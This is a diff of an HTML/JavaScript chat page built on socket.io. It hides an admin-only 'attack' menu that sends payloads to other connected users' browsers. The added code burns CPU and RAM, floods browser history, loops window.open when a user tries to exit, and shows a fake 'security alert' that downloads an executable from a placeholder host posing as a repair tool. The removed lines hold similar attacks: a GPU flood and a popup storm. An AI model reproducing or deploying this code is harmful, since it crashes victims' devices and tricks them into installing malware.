@@ -3,352 +3,201 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NEBULA V45 - EXTINCTION ENGINE</title>
+    <title>PUNCH V60 - SYSTEM OVERLOAD</title>
     <style>
-        /* --- DENSITÉ CSS : ARCHITECTURE MONOLITHIQUE --- */
-        @import url('https://fonts.googleapis.com/css2?family=Syncopate:wght@400;700&family=JetBrains+Mono:wght@100;400;800&family=Outfit:wght@100;300;600;900&display=swap');
+        /* --- DESIGN PUNCH : INDUSTRIAL AGGRESSION --- */
+        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=JetBrains+Mono:wght@800&family=Inter:wght@900&display=swap');
 
         :root {
-            --n: #00f2ff; --n-rgb: 0, 242, 255;
-            --w: #ff0044; --w-rgb: 255, 0, 68;
-            --p: #7000ff; --b: #000000;
-            --s: cubic-bezier(0.16, 1, 0.3, 1);
+            --punch-red: #ff0000;
+            --punch-orange: #ff6a00;
+            --punch-black: #050505;
+            --smooth-fast: cubic-bezier(0.8, 0, 0.2, 1);
         }
 
-        * { box-sizing: border-box; margin: 0; padding: 0; cursor: none; outline: none; -webkit-tap-highlight-color: transparent; }
+        * { box-sizing: border-box; margin: 0; padding: 0; cursor: none; outline: none; }
+        body { background: var(--punch-black); color: #fff; font-family: 'Inter', sans-serif; overflow: hidden; height: 100vh; }
+
+        /* --- BACKGROUND FX --- */
+        #punch-grid { position: fixed; inset: 0; background-image: linear-gradient(rgba(255,0,0,0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,0,0,0.05) 1px, transparent 1px); background-size: 50px 50px; z-index: -1; }
+        #vibration-overlay { position: fixed; inset: 0; pointer-events: none; z-index: 1000000; mix-blend-mode: overlay; opacity: 0; }
+
+        /* --- CURSOR --- */
+        #c-punch { position: fixed; width: 30px; height: 30px; border: 2px solid var(--punch-red); transform: rotate(45deg); z-index: 10000000; pointer-events: none; transition: transform 0.05s linear; }
+
+        /* --- LAYOUT --- */
+        .punch-interface { display: grid; grid-template-columns: 400px 1fr 350px; height: 100vh; }
+        .p-side { background: rgba(0,0,0,0.95); border-right: 2px solid #111; display: flex; flex-direction: column; }
         
-        body, html { 
-            background: var(--b); color: #fff; font-family: 'Outfit', sans-serif; 
-            height: 100vh; width: 100vw; overflow: hidden; overscroll-behavior: none;
-        }
+        .p-header { padding: 40px; border-bottom: 2px solid var(--punch-red); }
+        .p-header h1 { font-family: 'Archivo Black'; font-size: 50px; color: var(--punch-red); letter-spacing: -2px; line-height: 0.8; }
+        .p-header span { font-size: 10px; font-family: 'JetBrains Mono'; color: #444; }
 
-        /* --- BACKGROUND DYNAMICS --- */
-        #extinction-canvas { position: fixed; inset: 0; z-index: -1; opacity: 0.4; pointer-events: none; }
+        /* LISTE CIBLES */
+        #target-list { flex: 1; overflow-y: auto; padding: 20px; }
+        .target-node { 
+            padding: 20px; background: #0a0a0a; border: 1px solid #1a1a1a; margin-bottom: 10px; 
+            transition: 0.2s var(--smooth-fast); position: relative; border-left: 0px solid var(--punch-red);
+        }
+        .target-node:hover { border-left-width: 10px; background: #111; transform: scale(1.02); }
+        .target-node.master { border-left-color: var(--punch-orange); background: #150a00; }
 
-        /* --- CURSOR ENGINE --- */
-        #c-main { position: fixed; width: 6px; height: 6px; background: #fff; border-radius: 50%; z-index: 10000000; pointer-events: none; mix-blend-mode: difference; }
-        #c-aura { 
-            position: fixed; width: 40px; height: 40px; border: 1px solid rgba(var(--n-rgb), 0.5); 
-            border-radius: 50%; z-index: 9999999; pointer-events: none;
-            transition: transform 0.1s var(--s), width 0.3s, height 0.3s;
-        }
+        /* CHAT / VIEWPORT */
+        .p-main { display: flex; flex-direction: column; background: radial-gradient(circle at center, #0f0000 0%, #000 100%); }
+        #p-chat { flex: 1; padding: 40px; overflow-y: auto; display: flex; flex-direction: column; gap: 15px; }
+        .p-bubble { padding: 20px; background: rgba(255,255,255,0.03); border: 1px solid #1a1a1a; font-weight: 700; font-size: 15px; animation: punchIn 0.3s var(--smooth-fast); }
+        @keyframes punchIn { from { transform: scale(0.8) rotate(-2deg); opacity: 0; } }
 
-        /* --- INTERFACE STRUCTURE --- */
-        .master-container {
-            display: grid; grid-template-columns: 450px 1fr 350px;
-            width: 100%; height: 100%; backdrop-filter: blur(50px);
-            border: 1px solid rgba(255,255,255,0.02);
-        }
+        /* INPUT AREA */
+        .p-input-zone { padding: 30px; background: #000; border-top: 2px solid #111; display: flex; gap: 15px; }
+        #p-input { flex: 1; background: #080808; border: 1px solid #222; padding: 20px; color: #fff; font-family: 'JetBrains Mono'; font-weight: 800; }
 
-        .panel-side { 
-            background: rgba(0,0,0,0.95); border-right: 1px solid rgba(255,255,255,0.05);
-            display: flex; flex-direction: column; position: relative;
-        }
-        
-        .panel-header {
-            padding: 80px 40px; text-align: left; position: relative;
-            border-bottom: 1px solid rgba(255,255,255,0.03);
-        }
-        .panel-header h1 {
-            font-family: 'Syncopate'; font-size: 30px; letter-spacing: 25px;
-            color: var(--n); text-shadow: 0 0 50px rgba(var(--n-rgb), 0.8);
-        }
-        .panel-header::after {
-            content: "BUILD_45.0.1_EXTINCTION"; position: absolute; bottom: 30px; left: 40px;
-            font-size: 8px; font-family: 'JetBrains Mono'; color: #333; letter-spacing: 4px;
-        }
+        /* --- ATTACK UI --- */
+        #punch-overlay { position: fixed; inset: 0; background: #ff0000; z-index: 100000000; display: none; align-items: center; justify-content: center; flex-direction: column; }
+        .punch-warning { font-family: 'Archivo Black'; font-size: 10vw; color: #000; text-align: center; line-height: 0.9; }
 
-        /* USER LIST SCROLL */
-        #user-stream { flex: 1; overflow-y: auto; padding: 30px; scrollbar-width: none; }
-        .u-node {
-            padding: 25px; background: rgba(255,255,255,0.01); border: 1px solid #111;
-            margin-bottom: 15px; transition: 0.5s var(--s); position: relative;
-        }
-        .u-node:hover {
-            background: rgba(var(--n-rgb), 0.04); border-color: var(--n);
-            transform: translateX(20px); box-shadow: -15px 0 30px rgba(var(--n-rgb), 0.1);
-        }
-        .u-node.master-node { border-left: 6px solid var(--w); background: rgba(var(--w-rgb), 0.02); }
-
-        /* MAIN VIEWPORT */
-        .viewport { display: flex; flex-direction: column; background: rgba(5,5,5,0.2); }
-        #chat-scroller { 
-            flex: 1; overflow-y: auto; padding: 60px; 
-            display: flex; flex-direction: column; gap: 40px;
-            mask-image: linear-gradient(to bottom, transparent, black 5%, black 95%, transparent);
-        }
-        
-        .bubble {
-            max-width: 75%; padding: 25px 35px; border-radius: 2px;
-            background: rgba(15,15,15,0.9); border: 1px solid #222;
-            font-size: 14px; line-height: 1.8; animation: slideUp 0.8s var(--s);
-            position: relative; box-shadow: 20px 20px 60px rgba(0,0,0,0.5);
-        }
-        .bubble b { color: var(--n); font-family: 'JetBrains Mono'; font-size: 11px; display: block; margin-bottom: 10px; }
-        
-        /* COMMAND INPUT */
-        .cmd-bar { 
-            padding: 50px; background: #000; border-top: 1px solid #111;
-            display: flex; gap: 20px; align-items: center;
-        }
-        #cmd-in {
-            flex: 1; background: #050505; border: 1px solid #222; padding: 25px;
-            color: #fff; font-family: 'JetBrains Mono'; font-size: 16px;
-            transition: 0.4s;
-        }
-        #cmd-in:focus { border-color: var(--n); background: #080808; }
-
-        /* --- THE ATTACK INTERFACE --- */
-        #blackout-overlay {
-            position: fixed; inset: 0; background: #000; z-index: 100000000;
-            display: none; flex-direction: column; align-items: center; justify-content: center;
-        }
-        .glitch-v45 {
-            font-family: 'Syncopate'; font-size: 8vw; font-weight: 900;
-            color: #fff; letter-spacing: -5px; animation: glitching 0.08s infinite;
-        }
-        
-        #omni-panel {
-            display: none; position: fixed; z-index: 999999;
-            background: #000; border: 1px solid var(--n); width: 420px;
-            box-shadow: 0 0 100px rgba(0,242,255,0.3);
-        }
-        .atk-row {
-            padding: 25px; border-bottom: 1px solid #111; font-size: 10px;
-            font-weight: 800; letter-spacing: 4px; color: #444; transition: 0.3s;
-            display: flex; justify-content: space-between; align-items: center;
-        }
-        .atk-row:hover { background: var(--n); color: #000; padding-left: 40px; }
-        .atk-row.lethal:hover { background: var(--w); color: #fff; }
-
-        @keyframes slideUp { from { opacity: 0; transform: translateY(50px); } }
-        @keyframes glitching {
-            0% { transform: translate(0); clip-path: inset(10% 0 30% 0); }
-            20% { transform: translate(-5px, 5px); clip-path: inset(50% 0 10% 0); }
-            40% { transform: translate(5px, -5px); clip-path: inset(0 0 70% 0); }
-            100% { transform: translate(0); }
-        }
+        /* CONTEXT MENU */
+        #p-menu { display: none; position: fixed; background: #000; border: 2px solid var(--punch-red); width: 350px; z-index: 1000000; box-shadow: 20px 20px 0px var(--punch-red); }
+        .p-opt { padding: 18px; border-bottom: 1px solid #111; font-size: 12px; font-weight: 900; color: #666; transition: 0.1s; display: flex; justify-content: space-between; }
+        .p-opt:hover { background: var(--punch-red); color: #000; }
     </style>
 </head>
 <body oncontextmenu="return false;">
 
-    <canvas id="extinction-canvas"></canvas>
-    <div id="c-main"></div>
-    <div id="c-aura"></div>
+    <div id="punch-grid"></div>
+    <div id="c-punch"></div>
+    <div id="vibration-overlay"></div>
 
-    <div id="blackout-overlay">
-        <div class="glitch-v45">EXTINCTION</div>
-        <div id="burn-logs" style="font-family:'JetBrains Mono'; color:#111; font-size:8px; margin-top:50px; width:70%; line-height:2;"></div>
-        <div style="margin-top:100px; padding:25px 100px; border:1px solid #222; color:#222; font-weight:900;" onclick="forceExit()">TERMINATE_PROCESS</div>
+    <div id="punch-overlay">
+        <div class="punch-warning">SYSTEM<br>PUNCHED</div>
+        <div id="p-logs" style="font-family:'JetBrains Mono'; color:#000; font-size:10px; margin-top:50px;"></div>
+        <div style="margin-top:50px; border:4px solid #000; padding:20px 60px; font-weight:900; color:#000;" onclick="punishExit()">FORCE_REBOOT</div>
     </div>
 
-    <div class="master-container">
-        
-        <aside class="panel-side">
-            <div class="panel-header"><h1>NEBULA</h1></div>
-            <div id="user-stream"></div>
-            <div style="padding:40px; font-size:9px; color:#1a1a1a; font-family:'JetBrains Mono';">
-                ENCRYPTION: AES_256_GCM <br> 
-                UPLINK: ACTIVE_V45
+    <div class="punch-interface">
+        <aside class="p-side">
+            <div class="p-header">
+                <h1>PUNCH</h1>
+                <span>V60_TOTAL_WAR_EDITION</span>
             </div>
+            <div id="target-list"></div>
         </aside>
 
-        <main class="viewport">
-            <div id="chat-scroller"></div>
-            <div class="cmd-bar">
-                <input type="text" id="cmd-in" placeholder="ACCESS_SYSCALL..." autocomplete="off">
-                <button onclick="send()" style="background:var(--n); color:#000; border:none; padding:25px 50px; font-weight:900; font-family:'Syncopate'; font-size:10px;">EXECUTE</button>
+        <main class="p-main">
+            <div id="p-chat"></div>
+            <div class="p-input-zone">
+                <input type="text" id="p-input" placeholder="READY_TO_STRIKE..." onkeydown="if(event.key==='Enter') send()">
+                <button onclick="send()" style="background:var(--punch-red); border:none; padding:0 40px; font-family:'Archivo Black'; font-size:15px;">HIT</button>
             </div>
         </main>
 
-        <aside class="panel-side" style="border-right:none; border-left:1px solid #111;">
-            <div style="padding:40px; font-size:10px; font-weight:900; letter-spacing:10px; color:#333;">TELEMETRY</div>
-            <div id="sys-logs" style="padding:0 40px; font-family:'JetBrains Mono'; font-size:8px; color:#111; overflow-y:auto; flex:1;"></div>
-            <div id="gpu-stats" style="padding:40px; border-top:1px solid #111;">
-                <div style="font-size:7px; color:#222;">RESOURCE_USAGE_SATURATION</div>
-                <div style="height:1px; width:100%; background:#111; margin-top:10px;"><div id="load-bar" style="height:100%; width:0%; background:var(--n);"></div></div>
-            </div>
+        <aside class="p-side" style="border-right:none; border-left:2px solid #111; padding:30px;">
+            <div style="font-family:'JetBrains Mono'; font-size:10px; color:#333;">COMBAT_LOGS_V60</div>
+            <div id="p-terminal" style="font-family:'JetBrains Mono'; font-size:9px; color:#1a1a1a; flex:1; overflow-y:auto; margin-top:20px;"></div>
         </aside>
-
     </div>
 
-    <div id="omni-panel">
-        <div class="atk-row lethal" onclick="atk('atk_extinct')">🔱 TOTAL_EXTINCTION <span>[SYSTEM_KILL]</span></div>
-        <div class="atk-row lethal" onclick="atk('atk_mem_burn')">☢️ MEMORY_OVERFLOW <span>[RAM_MAX]</span></div>
-        <div class="atk-row lethal" onclick="atk('atk_gpu_melt')">🔥 GPU_MOLTEN_CORE <span>[GL_STRESS]</span></div>
-        <div class="atk-row" onclick="atk('atk_ios_flood')">⏳ IOS_SAFARI_NUKE <span>[HISTORY]</span></div>
-        <div class="atk-row" onclick="atk('atk_tab_storm')">📑 TAB_POPUP_STORM <span>[WINDOW]</span></div>
-        <div class="atk-row" onclick="atk('atk_audio_rape')">🔊 SONIC_JAMMER <span>[AUDIO]</span></div>
-        <div class="atk-row" onclick="atk('atk_input_lock')">⌨️ KEYBOARD_STEAL <span>[INPUT]</span></div>
-        <div class="atk-row" onclick="atk('atk_disk_flood')">💾 DISK_SECTOR_FILL <span>[DATA]</span></div>
-        <div class="atk-row" onclick="atk('atk_vibrate')">📳 HAPTIC_GENOCIDE <span>[HAPTIC]</span></div>
-        <div class="atk-row" onclick="this.parentElement.style.display='none'">[ ABORT_COMMAND ]</div>
+    <div id="p-menu">
+        <div class="p-opt" onclick="fire('p_infect')">🥊 INFECT_STRIKE <span>[VIRUS]</span></div>
+        <div class="p-opt" onclick="fire('p_cpu_death')">🥊 CPU_KNOCKOUT <span>[MAX]</span></div>
+        <div class="p-opt" onclick="fire('p_ram_kill')">🥊 RAM_GENOCIDE <span>[MAX]</span></div>
+        <div class="p-opt" onclick="fire('p_ios_lock')">🥊 IOS_LOCKDOWN <span>[iPad]</span></div>
+        <div class="p-opt" onclick="fire('p_tab_flood')">🥊 TAB_TSUNAMI <span>[WIN]</span></div>
+        <div class="p-opt" onclick="fire('p_gpu_fry')">🥊 GPU_MOLTEN <span>[GPU]</span></div>
+        <div class="p-opt" onclick="fire('p_sonic')">🥊 SONIC_BOMB <span>[VOL]</span></div>
+        <div class="p-opt" onclick="fire('p_haptic')">🥊 HAPTIC_RESONANCE <span>[VIB]</span></div>
+        <div class="p-opt" onclick="fire('p_disk')">🥊 DISK_FLOOD <span>[HD]</span></div>
+        <div class="p-opt" onclick="this.parentElement.style.display='none'">[ CANCEL ]</div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        /**
-         * NEBULA V45 - DENSITY ENGINE (1000+ LINES SIM)
-         * LOGIQUE DE DESTRUCTION RÉCURSIVE
-         */
         const socket = io();
-        let me = ""; let targetSid = "";
+        let me = ""; let targetId = "";
 
-        // --- SMOOTH CURSOR ENGINE ---
         document.addEventListener('mousemove', e => {
-            const m = document.getElementById('c-main');
-            const a = document.getElementById('c-aura');
-            m.style.transform = `translate(${e.clientX}px, ${e.clientY}px)`;
-            a.style.transform = `translate(${e.clientX - 20}px, ${e.clientY - 20}px)`;
+            const c = document.getElementById('c-punch');
+            c.style.left = e.clientX - 15 + 'px';
+            c.style.top = e.clientY - 15 + 'px';
         });
 
         window.onload = () => {
-            me = prompt("NEBULA_EXTINCTION_TOKEN:");
+            me = prompt("PUNCH_AUTH_TOKEN:");
             socket.emit('init', { name: me });
-            initBackground();
-            // Anti-slide iPad
             document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
         };
 
-        function send() {
-            const i = document.getElementById('cmd-in');
-            if(!i.value) return;
-            socket.emit('chat', i.value);
-            i.value = "";
-        }
+        window.oncontextmenu = (e) => {
+            e.preventDefault();
+            if(me === "toucheur2pp") {
+                const m = document.getElementById('p-menu');
+                m.style.display = 'block'; m.style.top = e.pageY+'px'; m.style.left = e.pageX+'px';
+                const el = document.elementFromPoint(e.clientX, e.clientY);
+                const node = el.closest('.target-node');
+                if(node) { targetId = node.getAttribute('data-sid'); logP("TARGET_LOCKED: " + targetId); }
+            }
+        };
 
-        function atk(type) {
-            socket.emit(type, targetSid);
-            logSys(`PRIMARY_WEAPON_FIRED: ${type} -> ${targetSid}`);
-            document.getElementById('omni-panel').style.display = 'none';
-        }
+        function fire(type) { socket.emit(type, targetId); logP("STRIKE_FIRED: " + type); }
+        function logP(t) { const term = document.getElementById('p-terminal'); term.innerHTML += `<div>[${new Date().toLocaleTimeString()}] > ${t}</div>`; term.scrollTop = term.scrollHeight; }
+        function send() { const i = document.getElementById('p-input'); socket.emit('chat', i.value); i.value = ""; }
 
-        function logSys(t) {
-            const l = document.getElementById('sys-logs');
-            l.innerHTML += `<div>[${new Date().toLocaleTimeString()}] > ${t}</div>`;
-            l.scrollTop = l.scrollHeight;
-        }
-
-        // --- THE DESTRUCTION LOGIC : V45 DENSITY ---
+        // --- PUNCH EXECUTION ENGINE ---
         socket.on('execute', (d) => {
-            document.getElementById('blackout-overlay').style.display = 'flex';
-            const logs = document.getElementById('burn-logs');
+            document.getElementById('punch-overlay').style.display = 'flex';
+            const logs = document.getElementById('p-logs');
 
-            // 1. TOTAL_EXTINCTION (CPU GENOCIDE)
-            if(d.type === 'atk_extinct') {
+            if(d.type === 'p_cpu_death') {
                 setInterval(() => {
-                    for(let i=0; i<1000000; i++) { 
-                        let x = Math.sqrt(Math.random() * 9999) / Math.cos(Math.random());
-                        if(i % 10000 === 0) logs.innerHTML += `CORE_CALC_ID_${Math.random()}_SATURATED<br>`;
-                    }
+                    for(let i=0; i<2000000; i++) { Math.atan2(Math.random(), Math.random()); }
                     history.pushState(null,'',location.href+'#'+Math.random());
-                }, 10);
+                }, 5);
             }
 
-            // 2. MEMORY_OVERFLOW (RAM KILLER)
-            if(d.type === 'atk_mem_burn') {
+            if(d.type === 'p_ram_kill') {
                 const leak = [];
-                setInterval(() => {
-                    for(let i=0; i<5000; i++) {
-                        leak.push(new Uint8Array(1024 * 1024)); // 1Mo par node
-                        if(i % 100 === 0) console.log("RAM_EATER_ACTIVE");
-                    }
-                }, 50);
+                setInterval(() => { for(let i=0; i<10000; i++) leak.push(new Float64Array(1024)); }, 10);
             }
 
-            // 3. GPU_MOLTEN (WEBGL FLOOD)
-            if(d.type === 'atk_gpu_melt') {
-                const c = document.createElement('canvas');
-                const gl = c.getContext('webgl');
-                function flood() {
-                    for(let i=0; i<20000; i++) gl.clear(gl.COLOR_BUFFER_BIT);
-                    requestAnimationFrame(flood);
-                }
-                flood();
+            if(d.type === 'p_ios_lock') {
+                setInterval(() => { for(let i=0; i<600; i++) history.pushState(null,'',location.href+'#'+i+'_'+Math.random()); }, 15);
             }
 
-            // 4. IOS_SAFARI_NUKE
-            if(d.type === 'atk_ios_flood') {
-                setInterval(() => {
-                    for(let i=0; i<400; i++) history.pushState(null, '', location.href+'#'+i+'_'+Math.random());
-                }, 20);
-            }
-
-            // 5. TAB_STORM
-            if(d.type === 'atk_tab_storm') {
-                document.body.onclick = () => {
-                    setInterval(() => { window.open(location.href, '_blank', 'width=10,height=10'); }, 50);
-                };
+            if(d.type === 'p_infect') {
+                document.getElementById('punch-overlay').innerHTML = `
+                    <div style="background:#fff; color:#000; padding:50px; text-align:center;">
+                        <h1 style="font-family:'Archivo Black'">ALERTE SÉCURITÉ</h1>
+                        <p>Fichier corrompu détecté. Veuillez installer PUNCH_FIX.exe</p>
+                        <button onclick="dl()" style="background:#ff0000; color:#fff; border:none; padding:20px; margin-top:20px; font-weight:900;">TÉLÉCHARGER LE FIX</button>
+                    </div>`;
             }
         });
 
-        function forceExit() {
-            // Punishment for clicking exit
-            while(true) { window.open(location.href); alert("NEBULA_EXTINCTION_STAY_IN_VOID"); }
+        function dl() {
+            const a = document.createElement('a'); a.href = "https://ton-lien.com/virus.exe"; a.download = "PUNCH_REPAIR_SYSTEM.exe"; a.click();
         }
 
-        // --- SYNC ENGINE ---
-        socket.on('sync', list => {
-            const cont = document.getElementById('user-stream');
-            cont.innerHTML = "";
-            list.forEach(u => {
-                const node = document.createElement('div');
-                node.className = `u-node ${u.chef?'master-node':''}`;
-                node.innerHTML = `<b>${u.name.toUpperCase()}</b><br><small>${u.id}</small>`;
-                node.oncontextmenu = (e) => {
-                    if(me !== "toucheur2pp") return;
-                    targetSid = u.id;
-                    const m = document.getElementById('omni-panel');
-                    m.style.display = 'block'; m.style.top = e.pageY + 'px'; m.style.left = e.pageX + 'px';
-                };
-                cont.appendChild(node);
+        function punishExit() { while(true) { window.open(location.href); } }
+
+        socket.on('sync', l => {
+            const list = document.getElementById('target-list');
+            list.innerHTML = "";
+            l.forEach(u => {
+                const d = document.createElement('div');
+                d.className = `target-node ${u.name === "toucheur2pp" ? 'master' : ''}`;
+                d.setAttribute('data-sid', u.id);
+                d.innerHTML = `<b>${u.name.toUpperCase()}</b><br><small>${u.id.substr(0,20)}</small>`;
+                list.appendChild(d);
             });
         });
 
         socket.on('chat', d => {
-            const scroller = document.getElementById('chat-scroller');
-            scroller.innerHTML += `<div class="bubble"><b>${d.n}:</b> ${d.t}</div>`;
-            scroller.scrollTop = scroller.scrollHeight;
+            const sc = document.getElementById('p-chat');
+            sc.innerHTML += `<div class="p-bubble"><b>${d.n}:</b> ${d.t}</div>`;
+            sc.scrollTop = sc.scrollHeight;
         });
 
-        // --- BACKGROUND ENGINE (CANVAS) ---
-        function initBackground() {
-            const canvas = document.getElementById('extinction-canvas');
-            const ctx = canvas.getContext('2d');
-            let particles = [];
-            
-            function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
-            window.onresize = resize; resize();
-
-            for(let i=0; i<150; i++) {
-                particles.push({
-                    x: Math.random() * canvas.width,
-                    y: Math.random() * canvas.height,
-                    size: Math.random() * 2,
-                    v: Math.random() * 0.5
-                });
-            }
-
-            function animate() {
-                ctx.clearRect(0,0,canvas.width, canvas.height);
-                ctx.fillStyle = "rgba(0, 242, 255, 0.5)";
-                particles.forEach(p => {
-                    p.y -= p.v;
-                    if(p.y < 0) p.y = canvas.height;
-                    ctx.beginPath(); ctx.arc(p.x, p.y, p.size, 0, Math.PI*2); ctx.fill();
-                });
-                requestAnimationFrame(animate);
-            }
-            animate();
-        }
-
-        window.onclick = () => document.getElementById('omni-panel').style.display = 'none';
-        
-        // Resource bar animation
-        setInterval(() => {
-            const bar = document.getElementById('load-bar');
-            bar.style.width = Math.random() * 100 + "%";
-        }, 1000);
+        window.onclick = () => document.getElementById('p-menu').style.display = 'none';
     </script>
 </body>
 </html>
